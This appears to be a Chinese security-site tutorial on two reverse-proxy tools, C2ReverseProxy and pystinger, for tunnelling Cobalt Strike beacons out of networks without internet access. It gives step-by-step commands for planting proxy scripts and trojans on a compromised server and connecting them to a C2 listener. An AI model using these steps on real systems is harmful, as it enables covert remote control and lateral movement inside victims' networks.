---
title: 工具推荐之不出网环境下上线CS
url: https://www.4hou.com/posts/vxL8
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2023-07-22
fetch_date: 2025-10-04T11:53:20.468378
---

# 工具推荐之不出网环境下上线CS

工具推荐之不出网环境下上线CS - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 工具推荐之不出网环境下上线CS

盛邦安全
[行业](https://www.4hou.com/category/industry)
2023-07-21 15:03:14

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)111022

收藏

导语：工具推荐之不出网环境下上线CS

**前言**

在实战攻防演练中，我们经常会遇到目标不出网的情况，即便获取了目标权限也不方便在目标网络进行下一步横向移动。本期我们将会推荐两个常用的代理工具，使我们能在不出网的环境下让目标上线到CS，方便后渗透的工作。

**工具1：DReverseServer**

工具链接：

https://github.com/Daybr4ak/C2ReverseProxy

工具原理：

利用代理转发将目标服务器上的CS的流量特征转发到CS服务端上，类似模拟一个木马在本地Listener进行上线。

官方使用说明：

1、将C2script目录下的对应文件，如proxy.ashx 以及C2ReverseServer上传到目标服务器。

2、使用C2ReverseServer建立监听端口：

./C2ReverseServer  (默认为64535)

3、修改C2script目录下对应文件的PORT，与C2ReverseServer监听的端口一致。

4、本地或C2服务器上运行C2ReverseClint工具

./C2ReverseClint -t C2IP:C2ListenerPort -u http://example.com/proxy.php (传送到目标服务器上的proxy.php路径)

5、使用CobaltStrike建立本地Listener(127.0.0.1 64535)端口与C2ReverseServer建立的端口对应

6、使用建立的Listner生成可执行文件beacon.exe传至目标服务器运行

7、可以看到CobaltStrike上线。

![QQ截图20230721141400.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922635984402.png "1689922156118023.png")

DReverseServer复现步骤

1、放置脚本文件到目标服务器

![QQ截图20230721141418.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922636189075.png "1689922197965900.png")

2、编译服务端程序

在cmd命令行输入 CGO\_ENABLED=0 GOOS=windows GOARCH=amd64 go build DReverseServer.go完成受害者端应用程序编译。

![QQ截图20230721141612.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922643180288.png "1689922342192142.png")

3、编译CS端程序

在cmd命令行输入CGO\_ENABLED=0 GOOS=darwin GOARCH=amd64 go build DReverseClint.go完成CS端应用程序编译。

![QQ截图20230721141636.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922644921014.png "1689922360160598.png")

4、生成stagerless木马

Staged 和 Stageless 的区别在于Staged实际功能只是程序执行后和C2 建立连接并接收真正的shellcode,然后加载执行(这里服务器不出网所以导致无法正常建立连接)；而 Stageless 直接省去了接收 Payload 的步骤。

![QQ截图20230721141704.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922651571835.png "1689922378194343.png")

5、目标客户端监听

![QQ截图20230721141733.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922652439040.png "1689922396105718.png")

6、CS端监听

![QQ截图20230721141802.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922653147411.png "1689922412148612.png")

7、等待上线

![QQ截图20230721141829.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922653457858.png "1689922425296035.png")

8、注意事项

a) 本地复现php脚本需打开socket选项。

![QQ截图20230721141912.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922654142432.png "1689922441293261.png")

b) 建议用户对CS的jar文件中的/resources/default.profile进行修改，将sleeptime值修改1000以下，这样CS生存的木马上线就不用默认等待60秒。

![QQ截图20230721141939.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922656152731.png "1689922454548523.png")

**工具2：pystinger**

工具链接：

https://github.com/FunnyWolf/pystinger/

工具原理：

利用内网反向代理转发将目标服务器上的木马上线与连接、操作流量特征通过HTTP协议方式转发至C2服务端，使其目标在不出网情况下上线MSF、viper、CS。

官方使用说明：

详见https://github.com/FunnyWolf/pystinger/blob/master/readme\_cn.md

pystinger复现步骤

工具可分为2块内容：

1、stinger\_server程序+proxy脚本。

2、stinger\_client程序+木马程序

![QQ截图20230721142027.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922656849420.png "1689922509153942.png")

1、放置脚本文件到目标服务器

访问下图页面代表成功。

![QQ截图20230721142052.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922657117169.png "1689922532197466.png")

2、在目标机器运行stinger\_server

![QQ截图20230721142116.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922658172453.png "1689922568381394.png")

3、在CS端运行stinger\_client

![QQ截图20230721142139.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922659251161.png "1689922629198902.png")

4、生成木马

根据stinger\_server反馈的Payload端口，在CS界面新增一个Listener，并使用这个Listener新生成一个恶意木马。

![QQ截图20230721142205.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922660114983.png "1689922643922207.png")

我们通过命令界面能看到网络连接详情，最后愉快的开启内网渗透。

![QQ截图20230721142248.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20230721/1689922658148422.png "1689922658148422.png")

如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?1jAadcx4)

#### 你可能感兴趣的

* [![]()

  Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
* [![]()

  【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
* [![]()

  蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
* [![]()

  聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
* [![]()

  2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)
* [![]()

  特勤局手册 | 监听办公室](https://www.4hou.com/posts/42B2)

![](https://img.4hou.com/portraits/3c8d3af7c49c95c16dd14518142759d6.png)

# [盛邦安全](https://www.4hou.com/member/9ZO4)

让网络空间更有序

#### 最新文章

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)
  2025-09-29 17:48:04
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)
  2025-09-29 14:55:37
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)
  2025-09-29 14:23:50
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)
  2025-09-28 17:20:40

[查看更多](https://www.4hou.com/member/9ZO4)

# 相关热文

* [Exchange/M365最新防范攻略！CACTER三步补齐原生防护短板](https://www.4hou.com/posts/l03l)

  CACTER
* [【附下载】2025我们身边的 网信安全 典型案例等 官方视频汇编](https://www.4hou.com/posts/kg3x)

  网络伍豪
* [蝉联荣誉！梆梆安全再度获选 “北京市委网信办第二届网络安全技术支撑单位”](https://www.4hou.com/posts/9jKP)

  梆梆安全
* [聚焦可信AI安全！SDC2025 议题重磅揭晓](https://www.4hou.com/posts/gy39)

  企业资讯
* [2025第五届太原网络安全高峰论坛成功举办](https://www.4hou.com/posts/8gJl)

  企业资讯
* [特勤局手册 | 监听办公室](https://www.4hou.com/posts/42B2)

  RC2反窃密实验室

![]()

[公司简介](https://www.4hou.com/about?title=公司简介)
|
[我要投稿](https://www.4hou.com/about?title=我要投稿)
|
[更新日志](https://www.4hou.com/about?title=更新日志)
|
[友情链接](https://www.4hou.com/about?title=友情链接)
|
[隐私政策](https://www.4hou.com/about?title=隐私政策)
|

[![](https://www.4hou.com/sihou/images/new4hou/weibo.png)](http://weibo.com/u/6069423878)
![](https://www.4hou.com/sihou/images/new4hou/wechat.png)

本站4hou.com，所使用的字体和图片文字等素材部分来源于原作者或互联网共享平台。如使用任何字体和图片文字有侵犯其版权所有方的，嘶吼将配合联系原作者核实，并做出删除处理。

[©2024 北京嘶吼文化传媒有限公司 京ICP备16063439号-1](https://beian.miit.gov.cn/)
本站由 ![](https://www.4hou.com/sihou/images/new4hou/txcloud.png) ![](https://www.4hou.com/sihou/images/new4hou/bdcloud.png) ![](https://www.4hou.com/sihou/images/new4hou/ucloud.png) 提供云计算服务

微信

[微博](http://weibo.com/u/6069423878)
[RSS](https://www.4hou.com/feed)
[知乎](https://zhuanlan.zhihu.com/roartalk)